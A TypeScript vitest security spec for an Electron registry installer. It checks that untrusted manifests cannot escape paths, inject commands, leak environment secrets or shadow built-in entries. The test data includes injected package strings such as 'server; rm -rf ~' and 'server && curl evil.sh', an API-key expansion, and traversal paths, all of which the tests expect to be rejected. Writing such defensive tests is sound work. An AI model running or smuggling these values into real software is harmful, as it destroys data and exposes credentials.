/**
 * registry-installer 보안 경계 스펙 (설계 §4.4 / §8 CRITICAL 경로).
 *
 * 여기 케이스들은 "테스트"라기보다 설치기의 하드룰 명세다: 경로탈출,
 * 임의 커맨드, env 유출, 내장 카탈로그 가림, 원장 기반 uninstall.
 * 하나라도 빠지면 untrusted manifest 가 사용자 머신을 쓸 수 있게 된다.
 */
import fs from "fs";
import os from "os";
import path from "path";
import { describe, expect, it } from "vitest";
import type {
  RegistryItem,
  RegistryMcpInstall,
} from "../../electron/registry-client";
import {
  buildMcpServerEntry,
  installRegistryItem,
  resolveContainedDest,
  uninstallRegistryItem,
  validateDest,
  validateRelFilePath,
  type InstallerDeps,
} from "../../electron/registry-installer";
import { readLedger } from "../../electron/registry-ledger";

const COMMIT = "a".repeat(40);

function tmpdir(prefix: string): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
}

function skillItem(overrides: Partial<RegistryItem> = {}): RegistryItem {
  return {
    schemaVersion: 1,
    id: "test-skill",
    name: "Test Skill",
    type: "skill",
    version: "1.0.0",
    description: "test",
    tier: "official",
    publisherName: "Marblo",
    status: "active",
    permissions: [],
    permissionsDeclared: true,
    path: "skills/test-skill",
    commit: COMMIT,
    install: {
      kind: "files",
      root: "claude-skills",
      dest: "test-skill",
      files: ["SKILL.md"],
    },
    installDerived: true,
    ...overrides,
  };
}

function mcpInstall(
  overrides: Partial<RegistryMcpInstall> = {},
): RegistryMcpInstall {
  return {
    kind: "mcp-server",
    runner: "npx",
    package: "@scope/server@1.2.3",
    args: [],
    envRequired: [],
    mcpKey: "test-server",
    ...overrides,
  };
}

function mcpItem(overrides: Partial<RegistryItem> = {}): RegistryItem {
  return {
    ...skillItem(),
    id: "test-mcp",
    type: "mcp-server",
    schemaVersion: 2,
    path: "mcp-servers/test-mcp",
    install: mcpInstall(),
    installDerived: false,
    ...overrides,
  };
}

/** 스텁 fetch: repoPath 별 콘텐츠 맵. 등록 안 된 경로는 404. */
function stubFetch(filesByUrlSuffix: Record<string, string>): typeof fetch {
  return (async (url: unknown) => {
    const u = String(url);
    const hit = Object.entries(filesByUrlSuffix).find(([suffix]) =>
      u.endsWith(suffix),
    );
    if (!hit) return { ok: false, status: 404 } as Response;
    const body = Buffer.from(hit[1], "utf-8");
    return {
      ok: true,
      status: 200,
      arrayBuffer: async () =>
        body.buffer.slice(body.byteOffset, body.byteOffset + body.byteLength),
    } as unknown as Response;
  }) as typeof fetch;
}

interface TestEnv {
  deps: InstallerDeps;
  root: string;
  claudeJson: { mcpServers?: Record<string, unknown> };
}

function makeEnv(fetchImpl?: typeof fetch): TestEnv {
  const base = tmpdir("marblo-registry-sec-");
  const root = path.join(base, "skills-root");
  fs.mkdirSync(root, { recursive: true });
  const claudeJson: TestEnv["claudeJson"] = {};
  const deps: InstallerDeps = {
    ledgerPath: path.join(base, "registry-installs.json"),
    rootsOverride: { "claude-skills": root },
    claudeJsonIo: {
      read: () => claudeJson as Record<string, unknown>,
      write: (data) => Object.assign(claudeJson, data),
    },
    fetchImpl: fetchImpl ?? stubFetch({ "SKILL.md": "# skill" }),
  };
  return { deps, root, claudeJson };
}

// ── CRITICAL: 경로 탈출 (§4.4 rule 1·2) ────────────────────────────

describe("dest containment", () => {
  it.each([
    "../../..",
    "..",
    ".",
    "/etc",
    "a/b",
    "a\\b",
    "A-upper",
    "한글",
    "a..b",
    "",
  ])("rejects dest %j", (dest) => {
    expect(() => validateDest(dest)).toThrow(/설치 거부/);
  });

  it("rejects a dest that is an existing symlink pointing outside root", () => {
    const { root } = makeEnv();
    const outside = tmpdir("marblo-outside-");
    fs.symlinkSync(outside, path.join(root, "escape-link"));
    expect(() => resolveContainedDest(root, "escape-link")).toThrow(/심링크/);
  });

  it("rejects an unknown root key (enum only — manifest cannot supply paths)", async () => {
    const { deps } = makeEnv();
    const item = skillItem({
      install: {
        kind: "files",
        root: "evil-root" as "claude-skills",
        dest: "test-skill",
        files: ["SKILL.md"],
      },
    });
    await expect(installRegistryItem(item, deps)).rejects.toThrow(
      /root "evil-root"/,
    );
  });

  it.each([
    "../x",
    "/abs",
    "a/../b",
    "a\\b",
    ".hidden",
    "a/./b",
    "C:evil",
    "a//b",
  ])("rejects file path %j in the allowlist", (p) => {
    expect(() => validateRelFilePath(p)).toThrow(/설치 거부/);
  });

  it("rejects file paths deeper than 8 segments", () => {
    expect(() => validateRelFilePath("a/b/c/d/e/f/g/h/i.md")).toThrow(/깊이/);
  });
});

// ── CRITICAL: 임의 커맨드 차단 (§4.4 rule 4) ───────────────────────

describe("mcp command safety", () => {
  it("rejects a runner outside the enum (no free-form command)", () => {
    expect(() =>
      buildMcpServerEntry(mcpInstall({ runner: "bash" as "npx" })),
    ).toThrow(/runner/);
  });

  it("rejects docker/binary runners in Phase 1a explicitly", () => {
    expect(() => buildMcpServerEntry(mcpInstall({ runner: "docker" }))).toThrow(
      /미지원/,
    );
    expect(() => buildMcpServerEntry(mcpInstall({ runner: "binary" }))).toThrow(
      /미지원/,
    );
  });

  it.each([
    "server; rm -rf ~",
    "server && curl evil.sh",
    "server", // 버전 핀 없음
    "server@latest",
    "server@1.2",
    "../evil@1.0.0",
    "server@1.0.0 --flag",
  ])("rejects unpinned/injected package %j", (pkg) => {
    expect(() => buildMcpServerEntry(mcpInstall({ package: pkg }))).toThrow(
      /package|env 확장/,
    );
  });

  it("command is exactly the runner binary — package rides in args", () => {
    const entry = buildMcpServerEntry(mcpInstall());
    expect(entry.command).toBe("npx");
    expect(entry.args).toEqual(["-y", "@scope/server@1.2.3"]);
  });

  it("rejects an mcp_key that would shadow a builtin catalog server", () => {
    expect(() => buildMcpServerEntry(mcpInstall({ mcpKey: "github" }))).toThrow(
      /내장 카탈로그/,
    );
  });

  it("rejects installing into an existing non-ledger mcpServers key", async () => {
    const { deps, claudeJson } = makeEnv();
    claudeJson.mcpServers = { "test-server": { command: "npx" } };
    await expect(installRegistryItem(mcpItem(), deps)).rejects.toThrow(
      /이미 존재/,
    );
  });
});

// ── CRITICAL: env 유출 차단 (§4.4 rule 5) ──────────────────────────

describe("env exfiltration defenses", () => {
  it("rejects ${...} expansion syntax in args (harness CLIs expand at runtime)", () => {
    expect(() =>
      buildMcpServerEntry(mcpInstall({ args: ["${ANTHROPIC_API_KEY}"] })),
    ).toThrow(/env 확장/);
  });

  it("rejects env_required entries that are not bare names", () => {
    for (const bad of ["PATH=x", "lower", "1NUM", "A B", "${HOME}"]) {
      expect(() =>
        buildMcpServerEntry(mcpInstall({ envRequired: [bad] })),
      ).toThrow(/env_required/);
    }
  });

  it("rejects env_required demanding harness credentials", () => {
    expect(() =>
      buildMcpServerEntry(mcpInstall({ envRequired: ["ANTHROPIC_API_KEY"] })),
    ).toThrow(/크레덴셜/);
  });

  it("never expands values — written env is the literal ${NAME} reference", () => {
    process.env.MARBLO_TEST_SECRET_XYZ = "super-secret-value";
    try {
      const entry = buildMcpServerEntry(
        mcpInstall({ envRequired: ["MARBLO_TEST_SECRET_XYZ"] }),
      );
      expect(entry.env.MARBLO_TEST_SECRET_XYZ).toBe(
        "${MARBLO_TEST_SECRET_XYZ}",
      );
      expect(JSON.stringify(entry)).not.toContain("super-secret-value");
    } finally {
      delete process.env.MARBLO_TEST_SECRET_XYZ;
    }
  });
});

// ── 게이트: tier / status ──────────────────────────────────────────

describe("tier and status gates", () => {
  it("refuses community-tier installs (list/disclosure only)", async () => {
    const { deps } = makeEnv();
    await expect(
      installRegistryItem(skillItem({ tier: "community" }), deps),
    ).rejects.toThrow(/community/);
  });

  it("refuses revoked items", async () => {
    const { deps } = makeEnv();
    await expect(
      installRegistryItem(skillItem({ status: "revoked" }), deps),
    ).rejects.toThrow(/회수/);
  });

  it("refuses items without an install contract", async () => {
    const { deps } = makeEnv();
    await expect(
      installRegistryItem(skillItem({ install: null }), deps),
    ).rejects.toThrow(/설치/);
  });
});

// ── files 설치 / 원장 기반 uninstall (§4.4 rule 7) ─────────────────

describe("files install + ledger-driven uninstall", () => {
  it("installs allowlisted files, records the ledger, uninstall deletes only that list", async () => {
    const { deps, root } = makeEnv(
      stubFetch({ "SKILL.md": "# skill", "docs/USAGE.md": "usage" }),
    );
    const item = skillItem({
      install: {
        kind: "files",
        root: "claude-skills",
        dest: "test-skill",
        files: ["SKILL.md", "docs/USAGE.md"],
      },
    });
    await installRegistryItem(item, deps);

    const dest = path.join(root, "test-skill");
    expect(fs.readFileSync(path.join(dest, "SKILL.md"), "utf-8")).toBe(
      "# skill",
    );
    expect(fs.existsSync(path.join(dest, "docs", "USAGE.md"))).toBe(true);
    const ledger = readLedger(deps.ledgerPath);
    expect(ledger.items["test-skill"].files?.map((f) => f.path)).toEqual([
      "SKILL.md",
      "docs/USAGE.md",
    ]);

    // 사용자 파일은 남긴다 — 원장 목록만 지운다.
    fs.writeFileSync(path.join(dest, "user-note.md"), "mine");
    uninstallRegistryItem("test-skill", deps);
    expect(fs.existsSync(path.join(dest, "SKILL.md"))).toBe(false);
    expect(fs.existsSync(path.join(dest, "docs"))).toBe(false);
    expect(fs.readFileSync(path.join(dest, "user-note.md"), "utf-8")).toBe(
      "mine",
    );
    expect(readLedger(deps.ledgerPath).items["test-skill"]).toBeUndefined();
  });

  it("a manifest edited after install cannot redirect the delete (ledger only)", async () => {
    const { deps, root } = makeEnv();
    await installRegistryItem(skillItem(), deps);
    // 공격 시나리오: 설치 후 manifest 의 dest 가 다른 곳을 가리키게 바뀌어도
    // uninstall 은 id → 원장 레코드만 본다. (API 상 manifest 를 받지도 않는다.)
    const victim = path.join(root, "innocent");
    fs.mkdirSync(victim);
    fs.writeFileSync(path.join(victim, "keep.txt"), "keep");
    uninstallRegistryItem("test-skill", deps);
    expect(fs.readFileSync(path.join(victim, "keep.txt"), "utf-8")).toBe(
      "keep",
    );
  });

  it("refuses to overwrite an existing dest the ledger does not own", async () => {
    const { deps, root } = makeEnv();
    fs.mkdirSync(path.join(root, "test-skill"));
    fs.writeFileSync(path.join(root, "test-skill", "SKILL.md"), "user content");
    await expect(installRegistryItem(skillItem(), deps)).rejects.toThrow(
      /원장 소유가 아님/,
    );
    expect(
      fs.readFileSync(path.join(root, "test-skill", "SKILL.md"), "utf-8"),
    ).toBe("user content");
  });

  it("refuses a silent overwrite of locally modified files on update", async () => {
    const { deps, root } = makeEnv();
    await installRegistryItem(skillItem(), deps);
    fs.writeFileSync(
      path.join(root, "test-skill", "SKILL.md"),
      "locally edited",
    );
    await expect(
      installRegistryItem(skillItem({ version: "1.1.0" }), deps),
    ).rejects.toThrow(/로컬 수정/);
    // 명시적 확인 후에만 덮는다.
    await installRegistryItem(skillItem({ version: "1.1.0" }), deps, {
      overwriteLocalChanges: true,
    });
    expect(
      fs.readFileSync(path.join(root, "test-skill", "SKILL.md"), "utf-8"),
    ).toBe("# skill");
  });

  it("leaves no partial install when a fetch fails mid-way", async () => {
    const { deps, root } = makeEnv(stubFetch({ "SKILL.md": "# skill" }));
    const item = skillItem({
      install: {
        kind: "files",
        root: "claude-skills",
        dest: "test-skill",
        files: ["SKILL.md", "MISSING.md"],
      },
    });
    await expect(installRegistryItem(item, deps)).rejects.toThrow(/404/);
    expect(fs.existsSync(path.join(root, "test-skill"))).toBe(false);
    expect(
      fs.readdirSync(root).filter((n) => n.startsWith(".reg-staging")),
    ).toEqual([]);
    expect(readLedger(deps.ledgerPath).items["test-skill"]).toBeUndefined();
  });

  it("rejects a files dest that shadows a builtin catalog skill", async () => {
    const { deps } = makeEnv();
    const item = skillItem({
      install: {
        kind: "files",
        root: "claude-skills",
        dest: "gstack",
        files: ["SKILL.md"],
      },
    });
    await expect(installRegistryItem(item, deps)).rejects.toThrow(
      /내장 카탈로그/,
    );
  });

  it("verifies per-file integrity digests when the manifest carries them", async () => {
    const { deps } = makeEnv(stubFetch({ "SKILL.md": "tampered" }));
    const item = skillItem({
      schemaVersion: 2,
      install: {
        kind: "files",
        root: "claude-skills",
        dest: "test-skill",
        files: ["SKILL.md"],
        integrity: { "SKILL.md": "0".repeat(64) },
      },
    });
    await expect(installRegistryItem(item, deps)).rejects.toThrow(/integrity/);
  });
});

// ── mcp-server 설치 왕복 ───────────────────────────────────────────

describe("mcp-server install/uninstall", () => {
  it("writes the config entry and removes it ledger-driven", async () => {
    const { deps, claudeJson } = makeEnv();
    const item = mcpItem({
      install: mcpInstall({ envRequired: ["GITHUB_TOKEN"] }),
    });
    await installRegistryItem(item, deps);
    expect(claudeJson.mcpServers?.["test-server"]).toEqual({
      command: "npx",
      args: ["-y", "@scope/server@1.2.3"],
      env: { GITHUB_TOKEN: "${GITHUB_TOKEN}" },
    });
    expect(readLedger(deps.ledgerPath).items["test-mcp"].install.mcpKey).toBe(
      "test-server",
    );
    uninstallRegistryItem("test-mcp", deps);
    expect(claudeJson.mcpServers?.["test-server"]).toBeUndefined();
    expect(readLedger(deps.ledgerPath).items["test-mcp"]).toBeUndefined();
  });
});
